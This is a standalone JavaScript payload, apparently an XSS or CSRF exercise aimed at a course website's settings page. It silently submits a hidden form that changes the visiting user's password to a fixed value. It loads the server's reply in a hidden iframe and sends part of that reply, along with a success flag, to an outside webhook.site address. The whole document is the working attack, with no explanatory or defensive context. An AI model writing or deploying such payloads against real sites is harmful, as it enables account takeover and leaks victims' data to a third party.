<script>
console.log('v9');

if(document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

function init() {
    var iframe = document.createElement('iframe');
    iframe.name = 'responseFrame';
    iframe.style.display = 'none';
    
    iframe.onload = function() {
        try {
            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            var responseHTML = iframeDoc.documentElement.outerHTML;
            var responseText = iframeDoc.body.innerText;

            var img = new Image();
            img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?response_length=" + responseHTML.length + 
                     "&text_sample=" + encodeURIComponent(responseText.substring(0, 200)) +
                     "&success=" + (responseText.includes('успех') || responseText.includes('success') || responseText.includes('изменен'));
                     
        } catch(e) {
            var img = new Image();
            img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error";
        }
    };
    
    document.body.appendChild(iframe);
    
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://cats.is-course.ru/settings';
    form.target = 'responseFrame';
    form.style.display = 'none';

    var pass1 = document.createElement('input');
    pass1.name = 'password';
    pass1.value = 'Abcdef_1234567';

    var pass2 = document.createElement('input');
    pass2.name = 'confirm-password';
    pass2.value = 'Abcdef_1234567';

    form.appendChild(pass1);
    form.appendChild(pass2);
    document.body.appendChild(form);

    form.submit();
}
</script>
